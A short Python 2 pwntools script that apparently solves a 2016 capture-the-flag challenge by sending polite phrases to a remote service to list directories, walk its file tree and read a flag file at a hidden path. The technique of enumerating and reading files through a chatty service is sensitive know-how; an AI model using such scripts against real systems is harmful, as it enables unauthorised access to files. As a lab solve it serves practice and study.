from pwn import *

p = remote('ctf2016.the-playground.dk', 13002)
p.recvuntil('Good day to you sir/madam. How may I help you today?\n')
p.sendline('Good day.')

def dir(s):
    p.sendline('Would you be so kind as to provide me with a list of items in the %s directory please?' % s)
    p.sendline('Thanks a bunch.')
    elems = []
    while 1:
        line = p.recvline().strip()
        if line == '':
            break
        elems.append(line.strip())
    return elems

def walk(root, ind):
    print ind + root
    for e in dir(root):
        if e.endswith('/'):
            walk(root + e, ind + ' ')
        else:
            print ind + ' ' + root + e + ' [FILE]'

def read(f):
    p.sendline('I wonder, would it be too much to ask for the content of %s?' % f)

# walk('/', '')

read('/rDbAY37dbJ/UOGPir7rRm/a9UeuuTFP4/flag')

p.interactive()
